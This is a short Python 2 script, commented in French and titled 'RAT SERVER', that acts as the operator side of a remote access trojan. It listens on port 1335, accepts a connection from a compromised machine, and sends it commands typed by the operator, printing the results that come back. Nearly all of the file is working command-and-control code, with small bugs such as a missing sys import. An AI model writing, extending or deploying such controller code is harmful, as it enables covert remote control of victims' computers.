####################################
#               RAT SERVER         #
#               YAKUMAI            #
####################################

#--*--coding:UTF-8--*--
#!/usr/bin/env python2.7

import socket
import os
import subprocess

host=''
port=1335

try:
#Creation Socket serveur avec gestion d'erreur try
   sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error,er:
   print 'Erreur lors de la creation du socket %s'%er
   sys.exit(1)

print "socket ok"

#Gestion d'erreur avec try
try:
    sock.bind((host,port))
except socket.gaierror,er:
    print 'Probleme pour la mise en ecoute: %s' %er
    sys.exit(1)

#Nombre d'hote maximun qui peuvent se connecter avec gestion d'erreur
try:
     sock.listen(5)
except socket.error,er:
     print 'Nombre hote maximun atteint'
     sys.exit
client,adresse=sock.accept()
print adresse

while 1:
  envs = raw_input('envoyer une commande, end pour arreter: \n')
  if envs=="end":
          break
  forw = client.send(envs)

  res = client.recv(4096)
  print 'resultat client' + res

sock.close()
client.close()